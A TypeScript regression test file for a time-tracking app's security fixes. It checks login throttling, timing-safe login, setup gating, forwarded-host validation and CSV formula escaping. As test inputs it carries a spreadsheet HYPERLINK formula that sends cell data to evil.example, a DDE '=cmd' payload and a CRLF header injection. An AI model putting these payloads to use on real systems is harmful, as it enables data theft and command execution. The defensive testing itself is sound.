// Regression tests for the 2026-08-15 security review. Same shape as the
// other route tests: call the real route handlers directly with a temp DB.
//
// Covers, in order: login throttling, member-enumeration via login timing,
// first-run setup gating, forwarded-host trust in appBaseUrl, and CSV
// formula injection in both exports.
import { afterAll, afterEach, beforeEach, describe, expect, it } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { NextRequest } from "next/server";

const tmpDbPath = path.join(os.tmpdir(), `opentime-test-security-${process.pid}-${Date.now()}.db`);
const tmpBackupDir = path.join(os.tmpdir(), `opentime-test-security-backups-${process.pid}-${Date.now()}`);
process.env.OPENTIME_DB = tmpDbPath;
process.env.OPENTIME_BACKUP_DIR = tmpBackupDir;

const { db } = await import("../src/lib/db");
const repo = await import("../src/lib/repo");
const auth = await import("../src/lib/auth");
const ratelimit = await import("../src/lib/ratelimit");
const { csvField } = await import("../src/lib/csv");
const { appBaseUrl } = await import("../src/lib/google");
const loginRoute = await import("../src/app/api/auth/login/route");
const setupRoute = await import("../src/app/api/setup/route");
const reportsCsvRoute = await import("../src/app/api/reports/csv/route");
const invoiceCsvRoute = await import("../src/app/api/invoices/[id]/csv/route");
const invoices = await import("../src/lib/invoices");

function resetDb() {
  db.exec(
    "DELETE FROM time_entries; DELETE FROM invoice_periods; DELETE FROM tasks; DELETE FROM sessions; DELETE FROM users;"
  );
}

function req(
  url: string,
  opts: { token?: string; method?: string; body?: unknown; headers?: Record<string, string> } = {}
) {
  const headers: Record<string, string> = { ...(opts.headers ?? {}) };
  if (opts.token) headers["cookie"] = `${auth.SESSION_COOKIE}=${opts.token}`;
  if (opts.body !== undefined) headers["content-type"] = "application/json";
  return new NextRequest(new URL(url, "http://localhost"), {
    method: opts.method ?? "GET",
    headers,
    body: opts.body !== undefined ? JSON.stringify(opts.body) : undefined,
  });
}

/** A login POST from a given source address (per-IP bucketing keys off this). */
function loginReq(email: string, password: string, ip = "203.0.113.9") {
  return req("http://localhost/api/auth/login", {
    method: "POST",
    body: { email, password },
    headers: { "x-forwarded-for": ip },
  });
}

beforeEach(() => {
  resetDb();
  ratelimit.resetRateLimits();
  delete process.env.OPENTIME_SETUP_TOKEN;
  delete process.env.OPENTIME_BASE_URL;
  delete process.env.OPENTIME_ALLOWED_HOSTS;
  fs.rmSync(tmpBackupDir, { recursive: true, force: true });
});

afterAll(() => {
  db.close();
  for (const f of [tmpDbPath, `${tmpDbPath}-wal`, `${tmpDbPath}-shm`]) {
    if (fs.existsSync(f)) fs.unlinkSync(f);
  }
  fs.rmSync(tmpBackupDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------- throttling

describe("POST /api/auth/login rate limiting", () => {
  beforeEach(() => {
    repo.createUser({ name: "Alice", email: "alice@example.com", password: "password123", role: "member" });
  });

  it("allows the free allowance of wrong passwords, then 429s", async () => {
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts; i++) {
      const res = await loginRoute.POST(loginReq("alice@example.com", "wrong"));
      expect(res.status).toBe(401);
    }
    const blocked = await loginRoute.POST(loginReq("alice@example.com", "wrong"));
    expect(blocked.status).toBe(429);
    expect(Number(blocked.headers.get("Retry-After"))).toBeGreaterThan(0);
  });

  it("blocks the CORRECT password too once locked out", async () => {
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts + 1; i++) {
      await loginRoute.POST(loginReq("alice@example.com", "wrong"));
    }
    // The whole point: an attacker who guesses right during a lockout still
    // gets nothing, and no session cookie is minted.
    const res = await loginRoute.POST(loginReq("alice@example.com", "password123"));
    expect(res.status).toBe(429);
    expect(res.headers.get("set-cookie")).toBeNull();
  });

  it("a success before the allowance is exhausted clears the bucket", async () => {
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts - 1; i++) {
      await loginRoute.POST(loginReq("alice@example.com", "wrong"));
    }
    const ok = await loginRoute.POST(loginReq("alice@example.com", "password123"));
    expect(ok.status).toBe(200);

    // Counter reset, so the full allowance is available again.
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts; i++) {
      const res = await loginRoute.POST(loginReq("alice@example.com", "wrong"));
      expect(res.status).toBe(401);
    }
  });

  it("locks the account across source addresses — rotating IPs doesn't help", async () => {
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts; i++) {
      await loginRoute.POST(loginReq("alice@example.com", "wrong", `198.51.100.${i}`));
    }
    const res = await loginRoute.POST(loginReq("alice@example.com", "wrong", "198.51.100.250"));
    expect(res.status).toBe(429);
  });

  it("one address spraying many accounts trips the per-IP bucket", async () => {
    // Each email stays under its own allowance; only the shared IP bucket sees
    // the volume.
    for (let i = 0; i < ratelimit.IP_LIMIT.freeAttempts; i++) {
      await loginRoute.POST(loginReq(`victim${i}@example.com`, "wrong", "192.0.2.7"));
    }
    const res = await loginRoute.POST(loginReq("someone-else@example.com", "wrong", "192.0.2.7"));
    expect(res.status).toBe(429);
  });

  it("a lockout expires and lets a correct password through", () => {
    const key = "email:expiry@example.com";
    const t0 = 1_000_000;
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts + 1; i++) {
      ratelimit.recordFailure(key, ratelimit.EMAIL_LIMIT, t0);
    }
    expect(ratelimit.checkRateLimit(key, t0).allowed).toBe(false);
    const past = t0 + ratelimit.EMAIL_LIMIT.maxDelayMs + 1;
    expect(ratelimit.checkRateLimit(key, past).allowed).toBe(true);
  });

  it("backs off exponentially, capped at maxDelayMs", () => {
    const key = "email:backoff@example.com";
    const t0 = 2_000_000;
    const delays: number[] = [];
    for (let i = 0; i < ratelimit.EMAIL_LIMIT.freeAttempts + 6; i++) {
      ratelimit.recordFailure(key, ratelimit.EMAIL_LIMIT, t0);
      const v = ratelimit.checkRateLimit(key, t0);
      if (!v.allowed) delays.push(v.retryAfterSecs);
    }
    for (let i = 1; i < delays.length; i++) {
      expect(delays[i]).toBeGreaterThanOrEqual(delays[i - 1]);
    }
    expect(delays[delays.length - 1]).toBeLessThanOrEqual(ratelimit.EMAIL_LIMIT.maxDelayMs / 1000);
  });
});

// ------------------------------------------------------------- enumeration

describe("login member enumeration", () => {
  it("verifyLoginPassword returns false for an unknown email", () => {
    expect(auth.verifyLoginPassword("anything", null)).toBe(false);
  });

  it("still derives a hash for an unknown email, so timing doesn't leak membership", () => {
    // Not a wall-clock assertion (too flaky for CI) — this pins the property
    // that makes the timing equal: the null branch does the same scrypt work
    // rather than returning early. A regression to `if (!user) return false`
    // would make this near-instant.
    const start = process.hrtime.bigint();
    auth.verifyLoginPassword("anything", null);
    const elapsedMs = Number(process.hrtime.bigint() - start) / 1e6;
    expect(elapsedMs).toBeGreaterThan(1);
  });

  it("gives the same status and message for unknown and wrong-password", async () => {
    repo.createUser({ name: "Alice", email: "alice@example.com", password: "password123", role: "member" });
    const unknown = await loginRoute.POST(loginReq("nobody@example.com", "password123", "198.51.100.1"));
    const wrong = await loginRoute.POST(loginReq("alice@example.com", "nope", "198.51.100.2"));
    expect(unknown.status).toBe(401);
    expect(wrong.status).toBe(401);
    expect(await unknown.json()).toEqual(await wrong.json());
  });
});

// ------------------------------------------------------------------- setup

describe("POST /api/setup gating", () => {
  const admin = { name: "Drew", email: "drew@reposcout.dev", password: "a-strong-password" };

  it("works normally on a genuinely fresh install", async () => {
    const res = await setupRoute.POST(req("http://localhost/api/setup", { method: "POST", body: admin }));
    expect(res.status).toBe(201);
    expect(repo.countUsers()).toBe(1);
  });

  it("409s once an account exists", async () => {
    repo.createUser({ ...admin, role: "admin" });
    const res = await setupRoute.POST(req("http://localhost/api/setup", { method: "POST", body: admin }));
    expect(res.status).toBe(409);
  });

  it("refuses when backups exist but the users table is empty (volume loss)", async () => {
    fs.mkdirSync(tmpBackupDir, { recursive: true });
    fs.writeFileSync(path.join(tmpBackupDir, "opentime-2026-08-14.db"), "");

    const res = await setupRoute.POST(req("http://localhost/api/setup", { method: "POST", body: admin }));
    expect(res.status).toBe(409);
    expect((await res.json()).error).toMatch(/backups/i);
    expect(repo.countUsers()).toBe(0);

    const status = await (await setupRoute.GET()).json();
    expect(status.data).toMatchObject({ needed: false, blocked: true });
  });

  it("requires the token when OPENTIME_SETUP_TOKEN is set", async () => {
    process.env.OPENTIME_SETUP_TOKEN = "s3cret-setup-token";

    const none = await setupRoute.POST(req("http://localhost/api/setup", { method: "POST", body: admin }));
    expect(none.status).toBe(403);

    const wrong = await setupRoute.POST(
      req("http://localhost/api/setup", { method: "POST", body: { ...admin, token: "guess" } })
    );
    expect(wrong.status).toBe(403);
    expect(repo.countUsers()).toBe(0);

    const right = await setupRoute.POST(
      req("http://localhost/api/setup", { method: "POST", body: { ...admin, token: "s3cret-setup-token" } })
    );
    expect(right.status).toBe(201);
  });

  it("a valid token overrides the backup guard", async () => {
    process.env.OPENTIME_SETUP_TOKEN = "s3cret-setup-token";
    fs.mkdirSync(tmpBackupDir, { recursive: true });
    fs.writeFileSync(path.join(tmpBackupDir, "opentime-2026-08-14.db"), "");

    const res = await setupRoute.POST(
      req("http://localhost/api/setup", { method: "POST", body: { ...admin, token: "s3cret-setup-token" } })
    );
    expect(res.status).toBe(201);
  });

  it("GET advertises that a token is required", async () => {
    process.env.OPENTIME_SETUP_TOKEN = "s3cret-setup-token";
    const status = await (await setupRoute.GET()).json();
    expect(status.data).toMatchObject({ needed: true, tokenRequired: true });
  });
});

// ------------------------------------------------------------ forwarded host

describe("appBaseUrl forwarded-host handling", () => {
  // A hand-rolled Headers stand-in rather than `new Headers(...)`: undici
  // rejects a CRLF-bearing value at construction time, so a real Headers
  // object can't express the injection case this needs to cover. (That
  // rejection is itself a layer of defence — it just isn't this one.)
  function fakeReq(headers: Record<string, string>) {
    return {
      headers: { get: (name: string) => headers[name.toLowerCase()] ?? null } as Headers,
      nextUrl: { origin: "http://localhost:3000" },
    };
  }

  it("OPENTIME_BASE_URL wins over any header", () => {
    process.env.OPENTIME_BASE_URL = "https://time.reposcout.com";
    const base = appBaseUrl(fakeReq({ "x-forwarded-host": "evil.example" }));
    expect(base).toBe("https://time.reposcout.com");
  });

  it("accepts a well-formed forwarded host", () => {
    expect(appBaseUrl(fakeReq({ "x-forwarded-host": "time.reposcout.com" }))).toBe(
      "https://time.reposcout.com"
    );
  });

  it("uses only the first hop of a proxy chain", () => {
    expect(appBaseUrl(fakeReq({ "x-forwarded-host": "time.reposcout.com, evil.example" }))).toBe(
      "https://time.reposcout.com"
    );
  });

  it.each([
    ["a path suffix", "evil.example/redirect"],
    ["userinfo", "evil.example@time.reposcout.com"],
    ["a scheme", "https://evil.example"],
    ["a CRLF injection", "evil.example\r\nX-Injected: 1"],
    ["whitespace", "evil example"],
  ])("falls back to the request origin on %s", (_label, host) => {
    expect(appBaseUrl(fakeReq({ "x-forwarded-host": host }))).toBe("http://localhost:3000");
  });

  it("rejects a bogus forwarded proto rather than reflecting it", () => {
    const base = appBaseUrl(
      fakeReq({ "x-forwarded-host": "time.reposcout.com", "x-forwarded-proto": "javascript" })
    );
    expect(base).toBe("https://time.reposcout.com");
  });

  it("honors OPENTIME_ALLOWED_HOSTS when set", () => {
    process.env.OPENTIME_ALLOWED_HOSTS = "time.reposcout.com";
    expect(appBaseUrl(fakeReq({ "x-forwarded-host": "time.reposcout.com" }))).toBe(
      "https://time.reposcout.com"
    );
    expect(appBaseUrl(fakeReq({ "x-forwarded-host": "evil.example" }))).toBe("http://localhost:3000");
  });
});

// --------------------------------------------------------------------- CSV

describe("csvField", () => {
  it.each(["=1+1", "+1", "-1+1", "@SUM(A1)", "\tcmd", "\rcmd"])(
    "neutralizes a leading formula trigger: %j",
    (value) => {
      // The apostrophe goes before the trigger character; a value that also
      // needs RFC 4180 quoting (\r does) carries it inside the quotes.
      expect(csvField(value)).toMatch(/^"?'/);
    }
  );

  it("neutralizes the classic exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.example?x="&A1,"Click")';
    const encoded = csvField(payload);
    // Quoted (it contains commas and quotes) AND formula-neutralized inside.
    expect(encoded.startsWith(`"'=`)).toBe(true);
  });

  it("still quotes per RFC 4180", () => {
    expect(csvField('a,b')).toBe('"a,b"');
    expect(csvField('say "hi"')).toBe('"say ""hi"""');
    expect(csvField("line\nbreak")).toBe('"line\nbreak"');
  });

  it("leaves ordinary values untouched", () => {
    expect(csvField("ABC1-fix-login-bug")).toBe("ABC1-fix-login-bug");
    expect(csvField("Alice")).toBe("Alice");
  });
});

describe("CSV exports neutralize injected content end to end", () => {
  it("GET /api/reports/csv escapes a malicious task name", async () => {
    const admin = repo.createUser({
      name: "Drew",
      email: "admin@reposcout.dev",
      password: "opentime-dev",
      role: "admin",
    });
    const token = auth.createSession(admin.id).token;
    repo.createEntry({
      userId: admin.id,
      task: '=HYPERLINK("http://evil.example","payroll")',
      startedAt: "2026-01-01T09:00:00.000Z",
      stoppedAt: "2026-01-01T10:00:00.000Z",
    });

    const res = await reportsCsvRoute.GET(req("http://localhost/api/reports/csv", { token }));
    const body = await res.text();
    expect(res.status).toBe(200);
    expect(body).not.toMatch(/,=HYPERLINK/);
    expect(body).toContain("'=HYPERLINK");
  });

  it("GET /api/invoices/[id]/csv escapes a malicious member name", async () => {
    const admin = repo.createUser({
      name: "Drew",
      email: "admin@reposcout.dev",
      password: "opentime-dev",
      role: "admin",
    });
    // The shape auto-provisioning can produce: display name from a Google profile.
    const member = repo.createUser({
      name: "=cmd|'/c calc'!A1",
      email: "mallory@example.com",
      password: "password123",
      role: "member",
    });
    const token = auth.createSession(admin.id).token;
    repo.createEntry({
      userId: member.id,
      task: "ab1-some-task",
      startedAt: "2026-01-05T09:00:00.000Z",
      stoppedAt: "2026-01-05T10:00:00.000Z",
    });
    invoices.createMissingPeriods(new Date("2026-03-01T00:00:00.000Z"));
    const period = invoices.listInvoicePeriods()[0];

    const res = await invoiceCsvRoute.GET(
      req(`http://localhost/api/invoices/${period.id}/csv`, { token }),
      { params: Promise.resolve({ id: period.id }) }
    );
    const body = await res.text();
    expect(res.status).toBe(200);
    expect(body).not.toMatch(/^=cmd/m);
    expect(body).toContain("'=cmd");
  });
});
